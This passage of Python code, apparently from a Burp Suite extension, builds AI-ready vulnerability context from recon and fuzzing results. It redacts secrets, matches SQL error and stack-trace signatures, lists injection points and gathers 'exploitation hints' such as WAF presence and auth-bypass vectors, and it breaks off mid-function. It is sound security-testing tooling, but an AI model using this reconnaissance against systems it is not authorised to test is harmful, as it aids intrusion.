        block = ensure_object(key)
        findings = block.get("findings")
        summary = block.get("summary")
        if not isinstance(findings, list):
            block["findings"] = []
            report["applied_defaults"].append("{}.findings=[]".format(key))
            report["warnings"].append("invalid_findings_array: {}".format(key))
        if not isinstance(summary, dict):
            block["summary"] = {}
            report["applied_defaults"].append("{}.summary={{}}".format(key))
            report["warnings"].append("invalid_summary_object: {}".format(key))
        block["finding_count"] = to_int(
            block.get("finding_count"), fallback=len(block.get("findings", []))
        )
        if not isinstance(block.get("no_scoring"), bool):
            block["no_scoring"] = True
            report["applied_defaults"].append("{}.no_scoring=true".format(key))
        if not isinstance(block.get("non_destructive"), bool):
            block["non_destructive"] = True
            report["applied_defaults"].append("{}.non_destructive=true".format(key))
        return block

    counterfactual = ensure_scoreless_block("counterfactual_differentials")
    sequence = ensure_findings_block("sequence_invariants")
    golden = ensure_findings_block("golden_tickets")
    state = ensure_findings_block("state_transitions")
    token_lineage = ensure_findings_block("token_lineage")
    parity_drift = ensure_findings_block("parity_drift")
    metadata["counterfactual_differential_count"] = len(
        counterfactual.get("findings", [])
    )
    metadata["sequence_invariant_count"] = len(sequence.get("findings", []))
    metadata["golden_ticket_count"] = len(golden.get("findings", []))
    metadata["state_transition_count"] = len(state.get("findings", []))
    metadata["token_lineage_count"] = len(token_lineage.get("findings", []))
    metadata["parity_drift_count"] = len(parity_drift.get("findings", []))

    prep_layer = ensure_object("ai_prep_layer")
    if self._ai_prep_layer_enabled():
        for key in ["invariant_hints", "sequence_candidates", "evidence_graph"]:
            if not isinstance(prep_layer.get(key), dict):
                prep_layer[key] = {}
                report["applied_defaults"].append("ai_prep_layer.{}={{}}".format(key))
                report["warnings"].append("ai_prep_layer_missing_block: {}".format(key))

    report["ok"] = len(report.get("errors", [])) == 0
    return self._sanitize_for_ai_payload(root), self._sanitize_for_ai_payload(report)

def _collect_all_tabs_ai_context(self, data_snapshot, attacks_snapshot):
    """Aggregate AI-ready context from all tabs (not only fuzzer)."""
    attack_samples = []
    for endpoint_key, attack in (attacks_snapshot or [])[:200]:
        attack_obj = attack if isinstance(attack, dict) else {}
        attack_samples.append(
            {
                "endpoint": self._ascii_safe(endpoint_key),
                "type": self._ascii_safe(attack_obj.get("type") or "Unknown"),
                "severity": self._calculate_attack_severity(attack_obj),
                "confidence": self._ascii_safe(attack_obj.get("confidence") or "Medium"),
                "risk": self._ascii_safe(attack_obj.get("risk") or ""),
                "note": self._ascii_safe(attack_obj.get("note") or ""),
                "params": self._sanitize_for_ai_payload(attack_obj.get("params") or []),
            }
        )

    all_tabs = {
        "summary": {
            "captured_endpoints": len(data_snapshot or {}),
            "fuzzing_attacks": len(attacks_snapshot or []),
        },
        "recon": {
            "endpoint_count": len(data_snapshot or {}),
            "endpoint_samples": self._sanitize_for_ai_payload(
                sorted(list((data_snapshot or {}).keys()))[:250]
            ),
        },
        "version_scanner": {
            "configured_versions": self._sanitize_for_ai_payload(
                self._parse_comma_newline_values(
                    self.version_input.getText()
                    if hasattr(self, "version_input") and self.version_input is not None
                    else ""
                )
            ),
            "result_count": len(getattr(self, "version_results", []) or []),
            "result_samples": self._snapshot_list_attr(
                "version_results", limit=250
            ),
            "output_tail": self._snapshot_text_area("version_area"),
        },
        "param_miner": {
            "configured_params": self._sanitize_for_ai_payload(
                self._parse_comma_newline_values(
                    self.param_input.getText()
                    if hasattr(self, "param_input") and self.param_input is not None
                    else ""
                )
            ),
            "result_count": len(getattr(self, "param_results", []) or []),
            "result_samples": self._snapshot_list_attr(
                "param_results", limit=250
            ),
            "output_tail": self._snapshot_text_area("param_area"),
        },
        "fuzzer": {
            "attack_count": len(attacks_snapshot or []),
            "attack_samples": self._sanitize_for_ai_payload(attack_samples),
            "output_tail": self._snapshot_text_area("fuzzer_area"),
        },
        "auth_replay": {
            "finding_count": len(getattr(self, "auth_replay_findings", []) or []),
            "findings": self._snapshot_list_attr(
                "auth_replay_findings",
                limit=250,
                lock_attr="auth_replay_lock",
            ),
            "output_tail": self._snapshot_text_area("auth_replay_area"),
        },
        "passive_discovery": {
            "finding_count": len(getattr(self, "passive_discovery_findings", []) or []),
            "findings": self._snapshot_list_attr(
                "passive_discovery_findings",
                limit=300,
                lock_attr="passive_discovery_lock",
            ),
            "output_tail": self._snapshot_text_area("passive_area"),
        },
        "counterfactual_differentials": {
            "finding_count": len(getattr(self, "counterfactual_findings", []) or []),
            "findings": self._snapshot_list_attr(
                "counterfactual_findings",
                limit=300,
                lock_attr="counterfactual_lock",
            ),
            "summary": self._snapshot_dict_attr(
                "counterfactual_summary", lock_attr="counterfactual_lock"
            ),
            "meta": self._snapshot_dict_attr(
                "counterfactual_meta", lock_attr="counterfactual_lock"
            ),
        },
        "sequence_invariants": {
            "finding_count": len(getattr(self, "sequence_invariant_findings", []) or []),
            "findings": self._snapshot_list_attr(
                "sequence_invariant_findings",
                limit=300,
                lock_attr="sequence_invariant_lock",
            ),
            "ledger": self._snapshot_dict_attr(
                "sequence_invariant_ledger", lock_attr="sequence_invariant_lock"
            ),
            "meta": self._snapshot_dict_attr(
                "sequence_invariant_meta", lock_attr="sequence_invariant_lock"
            ),
        },
        "golden_tickets": {
            "finding_count": len(getattr(self, "golden_ticket_findings", []) or []),
            "findings": self._snapshot_list_attr(
                "golden_ticket_findings",
                limit=300,
                lock_attr="golden_ticket_lock",
            ),
            "ledger": self._snapshot_dict_attr(
                "golden_ticket_ledger", lock_attr="golden_ticket_lock"
            ),
            "meta": self._snapshot_dict_attr(
                "golden_ticket_meta", lock_attr="golden_ticket_lock"
            ),
        },
        "state_transitions": {
            "finding_count": len(getattr(self, "state_transition_findings", []) or []),
            "findings": self._snapshot_list_attr(
                "state_transition_findings",
                limit=300,
                lock_attr="state_transition_lock",
            ),
            "ledger": self._snapshot_dict_attr(
                "state_transition_ledger", lock_attr="state_transition_lock"
            ),
            "meta": self._snapshot_dict_attr(
                "state_transition_meta", lock_attr="state_transition_lock"
            ),
        },
        "token_lineage": {
            "finding_count": len(getattr(self, "token_lineage_findings", []) or []),
            "findings": self._snapshot_list_attr(
                "token_lineage_findings",
                limit=300,
                lock_attr="token_lineage_lock",
            ),
            "ledger": self._snapshot_dict_attr(
                "token_lineage_ledger", lock_attr="token_lineage_lock"
            ),
            "meta": self._snapshot_dict_attr(
                "token_lineage_meta", lock_attr="token_lineage_lock"
            ),
        },
        "parity_drift": {
            "finding_count": len(getattr(self, "parity_drift_findings", []) or []),
            "findings": self._snapshot_list_attr(
                "parity_drift_findings",
                limit=300,
                lock_attr="parity_drift_lock",
            ),
            "ledger": self._snapshot_dict_attr(
                "parity_drift_ledger", lock_attr="parity_drift_lock"
            ),
            "meta": self._snapshot_dict_attr(
                "parity_drift_meta", lock_attr="parity_drift_lock"
            ),
        },
        "nuclei": {
            "output_tail": self._snapshot_text_area("nuclei_area"),
        },
        "httpx": {
            "output_tail": self._snapshot_text_area("httpx_area"),
        },
        "katana": {
            "discovered_count": len(getattr(self, "katana_discovered", []) or []),
            "discovered_samples": self._snapshot_list_attr(
                "katana_discovered", limit=300, lock_attr="katana_lock"
            ),
            "output_tail": self._snapshot_text_area("katana_area"),
        },
        "ffuf": {
            "result_count": len(getattr(self, "ffuf_results", []) or []),
            "result_samples": self._snapshot_list_attr(
                "ffuf_results", limit=300, lock_attr="ffuf_lock"
            ),
            "output_tail": self._snapshot_text_area("ffuf_area"),
        },
        "wayback": {
            "snapshot_count": len(getattr(self, "wayback_discovered", []) or []),
            "snapshot_samples": self._snapshot_list_attr(
                "wayback_discovered", limit=300, lock_attr="wayback_lock"
            ),
            "output_tail": self._snapshot_text_area("wayback_area"),
        },
        "sqlmap_verify": {
            "finding_count": len(getattr(self, "sqlmap_findings", []) or []),
            "findings": self._snapshot_list_attr(
                "sqlmap_findings", limit=300, lock_attr="sqlmap_lock"
            ),
            "verified_candidates": self._snapshot_list_attr(
                "sqlmap_verified_candidates", limit=200, lock_attr="sqlmap_lock"
            ),
            "output_tail": self._snapshot_text_area("sqlmap_area"),
        },
        "dalfox_verify": {
            "finding_count": len(getattr(self, "dalfox_findings", []) or []),
            "findings": self._snapshot_list_attr(
                "dalfox_findings", limit=300, lock_attr="dalfox_lock"
            ),
            "verified_candidates": self._snapshot_list_attr(
                "dalfox_verified_candidates", limit=200, lock_attr="dalfox_lock"
            ),
            "output_tail": self._snapshot_text_area("dalfox_area"),
        },
        "asset_discovery": {
            "discovered_count": len(getattr(self, "asset_discovered", []) or []),
            "discovered_samples": self._snapshot_list_attr(
                "asset_discovered", limit=300, lock_attr="asset_lock"
            ),
            "selected_domains": self._sanitize_for_ai_payload(
                list(getattr(self, "asset_selected_domains", []) or [])
            ),
            "output_tail": self._snapshot_text_area("asset_area"),
        },
        "openapi_drift": {
            "result_line_count": len(getattr(self, "openapi_drift_results", []) or []),
            "result_lines": self._snapshot_list_attr(
                "openapi_drift_results", limit=300, lock_attr="openapi_lock"
            ),
            "missing_candidates": self._snapshot_list_attr(
                "openapi_missing_candidates", limit=200, lock_attr="openapi_lock"
            ),
            "selected_spec_targets": self._snapshot_list_attr(
                "openapi_selected_spec_targets", limit=50
            ),
            "output_tail": self._snapshot_text_area("openapi_area"),
        },
        "graphql": {
            "result_line_count": len(getattr(self, "graphql_results", []) or []),
            "result_lines": self._snapshot_list_attr(
                "graphql_results", limit=300, lock_attr="graphql_lock"
            ),
            "recon_candidates": self._snapshot_list_attr(
                "graphql_recon_candidates", limit=200, lock_attr="graphql_lock"
            ),
            "selected_targets": self._snapshot_list_attr(
                "graphql_selected_targets", limit=80, lock_attr="graphql_lock"
            ),
            "output_tail": self._snapshot_text_area("graphql_area"),
        },
    }
    return self._sanitize_for_ai_payload(all_tabs)

def _ai_prep_layer_enabled(self):
    """Toggle additive AI prep artifacts without affecting scanner behavior."""
    import os

    raw = self._ascii_safe(
        os.environ.get(self.AI_PREP_LAYER_ENV_VAR, "")
    ).strip().lower()
    if not raw:
        return bool(self.AI_PREP_LAYER_DEFAULT_ENABLED)
    if raw in ["0", "false", "no", "off", "disable", "disabled"]:
        return False
    if raw in ["1", "true", "yes", "on", "enable", "enabled"]:
        return True
    return bool(self.AI_PREP_LAYER_DEFAULT_ENABLED)

def _build_ai_prep_layer(self, data_snapshot, attacks_snapshot):
    """Build non-destructive AI prep artifacts for post-collection triage."""
    # No endpoint filtering or suppression is applied in runtime scanning.
    payload = ai_prep_layer.build_ai_prep_layer(
        self, data_snapshot, attacks_snapshot
    )
    truncation = payload.get("truncation", {}) or {}
    total_trimmed = int(truncation.get("total_truncated", 0) or 0)
    if total_trimmed > 0:
        notice = (
            "[*] AI prep caps applied: hints={} sequence_candidates={} "
            "graph_nodes={} graph_edges={} (total truncated: {})\n"
        ).format(
            int(truncation.get("hints", 0) or 0),
            int(truncation.get("sequence_candidates", 0) or 0),
            int(truncation.get("graph_nodes", 0) or 0),
            int(truncation.get("graph_edges", 0) or 0),
            total_trimmed,
        )
        area = getattr(self, "fuzzer_area", None)
        if area is not None:
            SwingUtilities.invokeLater(lambda t=notice: area.append(t))
        self.log_to_ui(
            "[*] AI prep truncation visible: total trimmed {}".format(total_trimmed)
        )
    return payload

def _build_ai_prep_invariant_hints(self, data_snapshot):
    """Infer business/workflow invariants auditors often miss in request-level review."""
    return ai_prep_layer.build_ai_prep_invariant_hints(self, data_snapshot)

def _build_ai_prep_sequence_candidates(self, data_snapshot):
    """Generate adversarial multi-step sequences for deep logic abuse testing."""
    return ai_prep_layer.build_ai_prep_sequence_candidates(self, data_snapshot)

def _build_ai_prep_evidence_graph(self, data_snapshot, attacks_snapshot):
    """Build graph links between endpoints, params, auth context, and findings."""
    return ai_prep_layer.build_ai_prep_evidence_graph(
        self, data_snapshot, attacks_snapshot
    )

def _snapshot_list_attr(self, attr_name, limit=200, lock_attr=None):
    """Safely snapshot list-like attribute and sanitize for AI export."""
    values = []
    lock_obj = getattr(self, lock_attr, None) if lock_attr else None
    try:
        if lock_obj is not None:
            lock_obj.acquire()
        raw = getattr(self, attr_name, []) or []
        if isinstance(raw, list):
            values = list(raw[:limit])
        else:
            values = list(raw)[:limit]
    except Exception as e:
        self._callbacks.printError(
            "AI snapshot list error ({}): {}".format(attr_name, self._ascii_safe(e))
        )
        values = []
    finally:
        if lock_obj is not None:
            try:
                lock_obj.release()
            except Exception as release_err:
                self._callbacks.printError(
                    "AI snapshot list unlock error ({}): {}".format(
                        attr_name, self._ascii_safe(release_err)
                    )
                )
    return self._sanitize_for_ai_payload(values)

def _snapshot_dict_attr(self, attr_name, lock_attr=None):
    """Safely snapshot dict-like attribute and sanitize for AI export."""
    values = {}
    lock_obj = getattr(self, lock_attr, None) if lock_attr else None
    try:
        if lock_obj is not None:
            lock_obj.acquire()
        raw = getattr(self, attr_name, {}) or {}
        if isinstance(raw, dict):
            values = dict(raw)
        else:
            values = {}
    except Exception as e:
        self._callbacks.printError(
            "AI snapshot dict error ({}): {}".format(attr_name, self._ascii_safe(e))
        )
        values = {}
    finally:
        if lock_obj is not None:
            try:
                lock_obj.release()
            except Exception as release_err:
                self._callbacks.printError(
                    "AI snapshot dict unlock error ({}): {}".format(
                        attr_name, self._ascii_safe(release_err)
                    )
                )
    return self._sanitize_for_ai_payload(values)

def _snapshot_text_area(self, area_attr, max_chars=12000):
    """Snapshot bounded tail of tab output text for AI context."""
    area = getattr(self, area_attr, None)
    if area is None:
        return ""
    try:
        text = self._ascii_safe(area.getText() or "")
    except Exception as e:
        self._callbacks.printError(
            "AI snapshot text error ({}): {}".format(area_attr, self._ascii_safe(e))
        )
        return ""
    if len(text) > max_chars:
        text = text[-max_chars:]
    return self._sanitize_text_for_ai(text)

def _sanitize_for_ai_payload(self, value, depth=0):
    """Recursively sanitize payload fields before sharing with external AI."""
    if depth > 8:
        return "<truncated>"
    if value is None:
        return None
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return value
    if isinstance(value, dict):
        sanitized = {}
        count = 0
        for key, val in value.items():
            if count >= 400:
                break
            count += 1
            safe_key = self._ascii_safe(key)
            key_lower = self._ascii_safe(key, lower=True)
            # Keep numeric telemetry counters stable even when key names include
            # sensitive substrings (for example: observed_token_count).
            if key_lower.endswith("_count"):
                if isinstance(val, (int, float)):
                    sanitized[safe_key] = val
                    continue
                value_text = self._ascii_safe(val).strip()
                if value_text and re.match(r"^-?\d+$", value_text):
                    sanitized[safe_key] = int(value_text)
                    continue
            if any(
                marker in key_lower
                for marker in [
                    "authorization",
                    "cookie",
                    "token",
                    "secret",
                    "password",
                    "api_key",
                    "apikey",
                    "set-cookie",
                ]
            ):
                sanitized[safe_key] = "<redacted>"
            else:
                sanitized[safe_key] = self._sanitize_for_ai_payload(val, depth + 1)
        return sanitized
    if isinstance(value, (list, tuple, set)):
        out = []
        idx = 0
        for item in value:
            if idx >= 500:
                break
            idx += 1
            out.append(self._sanitize_for_ai_payload(item, depth + 1))
        return out
    return self._sanitize_text_for_ai(self._ascii_safe(value))

def _export_vulnerability_context_for_ai(
    self, data_snapshot, attacks_snapshot, max_items=120
):
    """Export detailed vulnerability context optimized for AI analysis."""
    context = {
        "scan_metadata": {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "total_endpoints": len(data_snapshot),
            "total_attacks": len(attacks_snapshot),
            "vulnerability_summary": self._get_vuln_summary(attacks_snapshot),
        },
        "vulnerabilities": [],
        "api_patterns": self._extract_api_patterns(data_snapshot),
        "authentication_flows": self._extract_auth_flows(data_snapshot),
        "business_logic_hints": self._extract_business_logic(data_snapshot),
    }

    for endpoint_key, attack in attacks_snapshot[:max_items]:
        entries = data_snapshot.get(endpoint_key)
        if not entries:
            continue
        entries_list = entries if isinstance(entries, list) else [entries]
        entry = self._get_entry(entries_list)
        attack_obj = attack if isinstance(attack, dict) else {}
        reflected = (
            entry.get("param_patterns", {}).get("reflected", [])
            if isinstance(entry.get("param_patterns", {}), dict)
            else []
        )
        vuln_context = {
            "endpoint": endpoint_key,
            "vulnerability_type": self._ascii_safe(
                attack_obj.get("type") or "Unknown"
            ),
            "severity": self._calculate_attack_severity(attack_obj),
            "confidence": self._ascii_safe(
                attack_obj.get("confidence") or "Medium"
            ),
            "request_sample": self._format_ai_sample(entry),
            "response_patterns": self._extract_response_patterns(entries_list),
            "error_messages": self._extract_errors(entries_list),
            "parameter_analysis": {
                "names": self._extract_param_names(entry),
                "types_detected": self._infer_param_types(entry),
                "validation_hints": self._detect_validation(entry),
            },
            "attack_surface": {
                "injection_points": self._identify_injection_points(entry),
                "reflection_points": reflected[:20],
                "encoding_context": self._detect_encoding_context(entry),
            },
            "similar_endpoints": self._find_similar_endpoints(
                endpoint_key, data_snapshot, limit=5
            ),
            "exploitation_hints": {
                "waf_detected": self._detect_waf(entry),
                "rate_limiting": self._detect_rate_limit(entries_list),
                "authentication_bypass_vectors": self._suggest_auth_bypass(
                    entry, attack_obj
                ),
            },
        }
        context["vulnerabilities"].append(vuln_context)

    return context

def _format_ai_sample(self, entry):
    """Build request/response sample with secret redaction for AI sharing."""
    base = self._format_sample(entry)
    redacted = dict(base)
    redacted["headers"] = self._sanitize_headers_for_ai(base.get("headers", {}))
    redacted["query"] = self._sanitize_text_for_ai(base.get("query", ""))
    redacted["request_body"] = self._sanitize_text_for_ai(
        base.get("request_body", "")
    )
    redacted["response_body"] = self._sanitize_text_for_ai(
        base.get("response_body", "")
    )
    return redacted

def _sanitize_headers_for_ai(self, headers):
    if not isinstance(headers, dict):
        return {}
    sensitive = set(
        [
            "authorization",
            "cookie",
            "set-cookie",
            "x-api-key",
            "api-key",
            "x-access-token",
            "x-auth-token",
            "proxy-authorization",
        ]
    )
    sanitized = {}
    for key, value in headers.items():
        key_text = self._ascii_safe(key)
        lower_key = self._ascii_safe(key, lower=True)
        value_text = self._ascii_safe(value)
        if lower_key in sensitive or any(
            marker in lower_key for marker in ["token", "secret", "apikey", "api-key"]
        ):
            sanitized[key_text] = "<redacted>"
        else:
            sanitized[key_text] = self._sanitize_text_for_ai(value_text)[:300]
    return sanitized

def _sanitize_text_for_ai(self, text):
    safe = self._ascii_safe(text or "")
    if not safe:
        return ""
    redacted = safe
    redacted = re.sub(
        r"(?i)(authorization\s*:\s*bearer\s+)[A-Za-z0-9\-\._~\+/=]+",
        r"\1<redacted>",
        redacted,
    )
    redacted = re.sub(
        r"(?i)(\b(?:access_token|refresh_token|id_token|api_key|apikey|secret|password)\b\s*[:=]\s*[\"']?)[^\"'&\s]+",
        r"\1<redacted>",
        redacted,
    )
    redacted = re.sub(
        r"\b[A-Za-z0-9\-_]{20,}\.[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_]{10,}\b",
        "<redacted_jwt>",
        redacted,
    )
    return redacted

def _extract_response_patterns(self, entries):
    """Extract response patterns that help AI detect success/failure signals."""
    entries_list = entries if isinstance(entries, list) else [entries]
    statuses = []
    lengths = []
    timings = []
    aggregated_signatures = {
        "sql_errors": set(),
        "stack_traces": set(),
        "debug_info": set(),
        "framework_errors": set(),
    }
    response_headers = []
    for sample in entries_list[:12]:
        if not isinstance(sample, dict):
            continue
        status_code = sample.get("response_status", 0)
        if isinstance(status_code, int):
            statuses.append(status_code)
        length_value = sample.get("response_length", 0)
        if isinstance(length_value, int):
            lengths.append(length_value)
        timing_value = sample.get("response_time_ms", 0)
        if isinstance(timing_value, int):
            timings.append(timing_value)
        if isinstance(sample.get("response_headers"), dict):
            response_headers.append(sample.get("response_headers"))
        body_text = sample.get("response_body", "")
        signatures = self._extract_error_signatures(body_text)
        for category, values in signatures.items():
            for value in values[:8]:
                aggregated_signatures[category].add(self._ascii_safe(value))

    error_signatures = {
        key: list(values)[:12] for key, values in aggregated_signatures.items()
    }
    return {
        "status_codes": sorted(list(set(statuses))),
        "content_length_variance": self._calc_length_variance(lengths),
        "timing_patterns_ms": timings[:20],
        "error_signatures": error_signatures,
        "success_indicators": {
            "json_structure": self._analyze_json_structure(entries_list),
            "html_elements": self._extract_html_elements(entries_list),
            "headers": self._extract_interesting_headers(response_headers),
        },
        "anomalies": self._detect_response_anomalies(
            statuses, lengths, timings, error_signatures
        ),
    }

def _calc_length_variance(self, lengths):
    values = [x for x in (lengths or []) if isinstance(x, int)]
    if not values:
        return {"min": 0, "max": 0, "delta": 0}
    min_v = min(values)
    max_v = max(values)
    return {"min": min_v, "max": max_v, "delta": max_v - min_v}

def _extract_error_signatures(self, response_body):
    """Extract error signatures that often indicate exploitable behavior."""
    body = self._ascii_safe(response_body or "")
    signatures = {
        "sql_errors": [],
        "stack_traces": [],
        "debug_info": [],
        "framework_errors": [],
    }
    if not body:
        return signatures

    sql_patterns = [
        r"SQL syntax.*?error",
        r"mysql_fetch",
        r"ORA-\d+",
        r"PostgreSQL.*?ERROR",
        r"SQLite.*?error",
        r"Unclosed quotation mark after the character string",
    ]
    for pattern in sql_patterns:
        matches = re.findall(pattern, body, re.I)
        for match in matches[:5]:
            signatures["sql_errors"].append(self._ascii_safe(match))

    if (" at " in body and ("Exception" in body or "Error" in body)) or (
        "Traceback (most recent call last)" in body
    ):
        signatures["stack_traces"].append(body[:500])

    debug_patterns = [r"\bdebug\b", r"\bverbose\b", r"\btrace\b", r"\bstack\b"]
    for pattern in debug_patterns:
        if re.search(pattern, body, re.I):
            signatures["debug_info"].append(pattern.strip("\\b"))

    framework_patterns = [
        r"Laravel",
        r"Symfony",
        r"Spring Boot",
        r"Django",
        r"Express",
        r"Rails",
        r"ASP\.NET",
    ]
    for pattern in framework_patterns:
        if re.search(pattern, body, re.I):
            signatures["framework_errors"].append(self._ascii_safe(pattern))

    for key in signatures.keys():
        signatures[key] = list(dict.fromkeys(signatures[key]))[:10]
    return signatures

def _analyze_json_structure(self, entries):
    paths = set()
    entries_list = entries if isinstance(entries, list) else [entries]
    for sample in entries_list[:8]:
        if not isinstance(sample, dict):
            continue
        parsed = self._parse_json_loose(sample.get("response_body", ""))
        if parsed is None:
            continue
        self._flatten_json_paths(parsed, "", paths, 0)
    return sorted(list(paths))[:60]

def _extract_html_elements(self, entries):
    tags = set()
    entries_list = entries if isinstance(entries, list) else [entries]
    for sample in entries_list[:5]:
        if not isinstance(sample, dict):
            continue
        body = self._ascii_safe(sample.get("response_body", ""))
        if not body:
            continue
        for tag in re.findall(r"<([a-zA-Z0-9]{1,24})", body):
            tags.add(self._ascii_safe(tag, lower=True))
            if len(tags) >= 30:
                break
        if len(tags) >= 30:
            break
    return sorted(list(tags))

def _extract_interesting_headers(self, header_list):
    interesting = {}
    keys_of_interest = [
        "content-type",
        "x-powered-by",
        "server",
        "set-cookie",
        "cache-control",
        "x-ratelimit-limit",
        "x-ratelimit-remaining",
        "retry-after",
        "x-frame-options",
        "content-security-policy",
        "x-content-type-options",
    ]
    for headers in header_list[:8]:
        if not isinstance(headers, dict):
            continue
        for key, value in headers.items():
            key_lower = self._ascii_safe(key, lower=True)
            if key_lower in keys_of_interest:
                interesting[key_lower] = self._ascii_safe(value)[:200]
    return interesting

def _detect_response_anomalies(
    self, statuses, lengths, timings, error_signatures
):
    anomalies = []
    unique_statuses = list(set(statuses))
    if len(unique_statuses) >= 3:
        anomalies.append("high_status_variation")
    if any(s >= 500 for s in unique_statuses):
        anomalies.append("server_error_present")
    length_delta = self._calc_length_variance(lengths).get("delta", 0)
    if length_delta > 2500:
        anomalies.append("large_response_length_delta")
    if timings and (max(timings) - min(timings)) > 1500:
        anomalies.append("high_response_time_variance")
    if any(error_signatures.get(k) for k in ["sql_errors", "stack_traces"]):
        anomalies.append("error_signature_detected")
    return anomalies

def _extract_errors(self, entries):
    entries_list = entries if isinstance(entries, list) else [entries]
    collected = []
    for sample in entries_list[:8]:
        if not isinstance(sample, dict):
            continue
        signatures = self._extract_error_signatures(sample.get("response_body", ""))
        for category, values in signatures.items():
            for value in values[:4]:
                collected.append(
                    {
                        "category": category,
                        "message": self._ascii_safe(value)[:300],
                        "status_code": sample.get("response_status", 0),
                    }
                )
                if len(collected) >= 30:
                    return collected
    return collected

def _extract_param_names(self, entry):
    names = set()
    params = entry.get("parameters", {}) or {}
    if not isinstance(params, dict):
        return []
    for _, values in params.items():
        if isinstance(values, dict):
            for key in values.keys():
                names.add(self._ascii_safe(key))
        elif isinstance(values, list):
            for item in values:
                names.add(self._ascii_safe(item))
    return sorted([name for name in names if name])[:120]

def _infer_param_types(self, entry):
    inferred = {}
    param_patterns = entry.get("param_patterns", {}) or {}
    type_hints = param_patterns.get("param_types", {}) if isinstance(param_patterns, dict) else {}
    if isinstance(type_hints, dict):
        for key, value in type_hints.items():
            inferred[self._ascii_safe(key)] = self._ascii_safe(value)

    params = entry.get("parameters", {}) or {}
    if isinstance(params, dict):
        for _, values in params.items():
            if isinstance(values, dict):
                for key, value in values.items():
                    key_str = self._ascii_safe(key)
                    if key_str in inferred:
                        continue
                    raw_value = self._ascii_safe(value)
                    lower_value = self._ascii_safe(value, lower=True)
                    if lower_value in ["true", "false"]:
                        inferred[key_str] = "boolean"
                    elif re.match(r"^-?\d+$", raw_value):
                        inferred[key_str] = "integer"
                    elif re.match(r"^-?\d+\.\d+$", raw_value):
                        inferred[key_str] = "float"
                    elif re.match(
                        r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$",
                        lower_value,
                    ):
                        inferred[key_str] = "uuid"
                    elif "@" in raw_value:
                        inferred[key_str] = "email"
                    elif raw_value.startswith("{") or raw_value.startswith("["):
                        inferred[key_str] = "json"
                    else:
                        inferred[key_str] = "string"
            elif isinstance(values, list):
                for item in values:
                    key_str = self._ascii_safe(item)
                    if key_str and key_str not in inferred:
                        inferred[key_str] = "unknown"
    return inferred

def _detect_validation(self, entry):
    body = self._ascii_safe(entry.get("response_body", ""), lower=True)
    status_code = int(entry.get("response_status", 0) or 0)
    keywords = []
    for keyword in [
        "invalid",
        "required",
        "must be",
        "too long",
        "too short",
        "format",
        "constraint",
        "validation",
    ]:
        if keyword in body:
            keywords.append(keyword)
    return {
        "detected": bool(keywords or status_code in [400, 422]),
        "status_code": status_code,
        "keywords": keywords[:10],
    }

def _identify_injection_points(self, entry):
    points = set(self._extract_param_names(entry))
    request_body = self._ascii_safe(entry.get("request_body", ""))
    parsed_body = self._parse_json_loose(request_body)
    if parsed_body is not None:
        json_paths = set()
        self._flatten_json_paths(parsed_body, "", json_paths, 0)
        points.update([self._ascii_safe(path) for path in json_paths])
    return sorted([x for x in points if x and x != "<root>"])[:80]

def _detect_encoding_context(self, entry):
    content_type = self._ascii_safe(entry.get("content_type", ""), lower=True)
    enc = entry.get("encryption_indicators", {}) or {}
    request_body = self._ascii_safe(entry.get("request_body", ""))
    hints = []
    if re.search(r"[A-Za-z0-9+/]{32,}={0,2}", request_body):
        hints.append("base64-like")
    if re.search(r"[0-9a-fA-F]{32,}", request_body):
        hints.append("hex-like")
    return {
        "content_type": content_type,
        "encryption_detected": bool(enc.get("likely_encrypted")),
        "encryption_types": list(enc.get("types", []) or []),
        "body_encoding_hints": hints,
    }

def _find_similar_endpoints(self, endpoint_key, data_snapshot, limit=5):
    target_entries = data_snapshot.get(endpoint_key)
    if not target_entries:
        return []
    target_entry = self._get_entry(target_entries)

    similarities = []
    for key, entries in data_snapshot.items():
        if key == endpoint_key:
            continue
        entry = self._get_entry(entries)
        similarity_score = self._calculate_endpoint_similarity(target_entry, entry)
        if similarity_score > 0.35:
            similarities.append(
                {
                    "endpoint": key,
                    "similarity": similarity_score,
                    "shared_params": self._get_shared_params(target_entry, entry),
                    "behavioral_similarity": self._compare_behaviors(
                        target_entry, entry
                    ),
                }
            )
    similarities = sorted(similarities, key=lambda x: x["similarity"], reverse=True)
    return similarities[:limit]

def _calculate_endpoint_similarity(self, target_entry, other_entry):
    target_path = self._ascii_safe(
        target_entry.get("normalized_path") or target_entry.get("path") or "/",
        lower=True,
    )
    other_path = self._ascii_safe(
        other_entry.get("normalized_path") or other_entry.get("path") or "/",
        lower=True,
    )
    target_segs = set(self._split_path_segments(target_path))
    other_segs = set(self._split_path_segments(other_path))
    path_union = target_segs.union(other_segs)
    path_score = 0.0
    if path_union:
        path_score = float(len(target_segs.intersection(other_segs))) / float(
            len(path_union)
        )

    method_score = 0.25 if (
        self._ascii_safe(target_entry.get("method"), lower=True)
        == self._ascii_safe(other_entry.get("method"), lower=True)
    ) else 0.0

    target_params = set(self._extract_param_names(target_entry))
    other_params = set(self._extract_param_names(other_entry))
    param_union = target_params.union(other_params)
    param_score = 0.0
    if param_union:
        param_score = float(
            len(target_params.intersection(other_params))
        ) / float(len(param_union))

    score = (0.5 * path_score) + method_score + (0.25 * param_score)
    return round(min(1.0, max(0.0, score)), 3)

def _get_shared_params(self, target_entry, other_entry):
    target_params = set(self._extract_param_names(target_entry))
    other_params = set(self._extract_param_names(other_entry))
    return sorted(list(target_params.intersection(other_params)))[:30]

def _compare_behaviors(self, target_entry, other_entry):
    target_status = int(target_entry.get("response_status", 0) or 0)
    other_status = int(other_entry.get("response_status", 0) or 0)
    target_auth = set(
        [self._ascii_safe(x, lower=True) for x in (target_entry.get("auth_detected", []) or [])]
    )
    other_auth = set(
        [self._ascii_safe(x, lower=True) for x in (other_entry.get("auth_detected", []) or [])]
    )
    return {
        "status_proximity": abs(target_status - other_status),
        "auth_overlap": bool(target_auth.intersection(other_auth)),
        "content_type_match": self._ascii_safe(
            target_entry.get("content_type", ""), lower=True
        )
        == self._ascii_safe(other_entry.get("content_type", ""), lower=True),
    }

def _detect_waf(self, entry):
    headers = entry.get("response_headers", {}) or {}
    body = self._ascii_safe(entry.get("response_body", ""), lower=True)
    signals = []
    waf_header_markers = [
        "cf-ray",
        "x-sucuri-id",
        "x-akamai",
        "x-imperva-id",
        "x-cdn",
    ]
